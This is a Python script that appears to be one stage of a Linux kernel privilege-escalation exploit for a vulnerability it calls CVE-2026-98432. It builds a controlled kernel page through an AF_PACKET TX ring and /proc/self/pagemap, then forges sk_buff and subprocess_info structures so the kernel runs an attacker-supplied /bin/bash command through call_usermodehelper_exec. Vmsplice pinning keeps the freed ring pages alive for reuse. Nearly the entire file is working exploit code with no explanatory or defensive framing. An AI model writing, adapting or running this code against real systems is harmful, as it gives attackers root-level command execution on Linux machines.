#!/usr/bin/env python3
"""ringone.py <page_offset_base> <ex> <wk> <cmd>

Deterministic controlled-page primitive for the CVE-2026-98432 payload.

* creates one AF_PACKET TX ring (12 x 4 KiB blocks),
* reads the real PFNs of the ring pages from /proc/self/pagemap,
* computes the direct-map address G = page_offset_base + PFN*4096 of block 0,
* writes the prior-art fake sk_buff + subprocess_info page blob (with
  P = G + 0x10) into every block,
* pins the pages with vmsplice, closes the socket + mmap (freeing the
  pg_vec array) and keeps the frames alive through the pipe,
* prints ``G=0x...`` and holds.

The fake skb sets _skb_refdst to a fake dst in the same page so that
skb_release_head_state() calls dst_release() first and the destructor
call_usermodehelper_exec(skb, wait) gets wait = UMH_NO_WAIT (RSI = 0).
"""
import ctypes
import mmap
import os
import socket
import struct
import sys
import time

PET = 4096
BN = 12
ETH_P_ALL = 3
SOL_PACKET = 263
PACKET_VERSION = 10
PACKET_TX_RING = 13
TPACKET_V1 = 0

libc = ctypes.CDLL(None, use_errno=True)
libc.vmsplice.restype = ctypes.c_ssize_t


class IOV(ctypes.Structure):
    _fields_ = [("base", ctypes.c_void_p), ("len", ctypes.c_size_t)]


def build(P, ex, wk, cmd):
    b = bytearray(PET)

    def w(o, v, l=8):
        b[o:o + l] = int(v).to_bytes(l, 'little')

    o = 0x10
    S = P + o
    w(o + 0, 0)
    w(o + 8, S + 8)
    w(o + 16, S + 8)
    w(o + 24, wk)          # subprocess_info.work.func
    w(o + 32, 0)           # complete = NULL
    w(o + 40, P + 0x400)   # path
    w(o + 48, P + 0x480)   # argv
    w(o + 56, P + 0x500)   # envp
    w(o + 64, 0, 4)        # wait (unused once dst_release forces RSI=0)
    w(o + 68, 0, 4)
    w(o + 72, 0)
    w(o + 80, 0)
    # skb->_skb_refdst: non-NULL, low bit 0 -> dst_release() -> esi=0
    w(o + 88, P + 0x900)
    w(0x940, 0x40000000, 4)  # fake dst __refcnt (P+0x900 fake dst, +0x40)
    w(o + 96, ex)          # skb->destructor = call_usermodehelper_exec
    w(o + 104, 0)
    b[o + 126] = 0x05
    w(o + 128, 0)
    w(o + 192, 0x100, 4)   # end
    w(o + 200, P + 0x100)  # head
    w(o + 220, 1, 4)
    w(o + 224, 0)
    w(o + 464, 5, 4)
    w(0x220, 2, 4)         # shinfo dataref
    b[0x400:0x409] = b"/bin/bash"
    b[0x420:0x423] = b"-c\x00"
    cm = cmd.encode()[:0x2ff]
    b[0x600:0x600 + len(cm)] = cm
    w(0x480, P + 0x400)
    w(0x488, P + 0x420)
    w(0x490, P + 0x600)
    w(0x498, 0)
    b[0x540:0x547] = b"HOME=/\x00"
    pe = b"PATH=/sbin:/bin:/usr/sbin:/usr/bin"
    b[0x548:0x548 + len(pe) + 1] = pe + b"\x00"
    w(0x500, P + 0x540)
    w(0x508, P + 0x548)
    w(0x510, 0)
    return bytes(b)


def pfn_of(va):
    fd = os.open("/proc/self/pagemap", os.O_RDONLY)
    try:
        os.lseek(fd, (va // PET) * 8, 0)
        e = struct.unpack("<Q", os.read(fd, 8))[0]
    finally:
        os.close(fd)
    if not (e >> 63) & 1:
        return None
    return e & ((1 << 55) - 1)


def main():
    pob = int(sys.argv[1], 0)
    ex = int(sys.argv[2], 0)
    wk = int(sys.argv[3], 0)
    cmd = sys.argv[4] if len(sys.argv) > 4 else "id > /tmp/PWNED"
    req = struct.pack("IIII", PET, BN, 2048, 24)
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    s.bind(("lo", 0))
    s.setsockopt(SOL_PACKET, PACKET_VERSION, TPACKET_V1)
    s.setsockopt(SOL_PACKET, PACKET_TX_RING, req)
    m = mmap.mmap(s.fileno(), PET * BN, mmap.MAP_SHARED,
                  mmap.PROT_READ | mmap.PROT_WRITE)
    va = ctypes.addressof(ctypes.c_char.from_buffer(m))
    pfns = []
    for k in range(BN):
        pfns.append(pfn_of(va + k * PET))
    if not pfns[0]:
        print("pagemap PFN unavailable", flush=True)
        return 1
    page = pob + (pfns[0] << 12)
    S = page + 0x10
    blob = build(page, ex, wk, cmd)
    for k in range(BN):
        m[k * PET:(k + 1) * PET] = blob
    print("va=%#x pfn0=%#x page=%#x S=%#x" % (va, pfns[0], page, S), flush=True)
    r, wfd = os.pipe()
    base = ctypes.addressof(ctypes.c_char.from_buffer(m))
    io = IOV(ctypes.c_void_p(base), PET * BN)
    res = libc.vmsplice(wfd, ctypes.byref(io), 1, 0)
    print("pinned=%d" % res, flush=True)
    s.close()
    m.close()
    print("pg_vec_freed", flush=True)
    while True:
        time.sleep(3600)


if __name__ == "__main__":
    sys.exit(main())
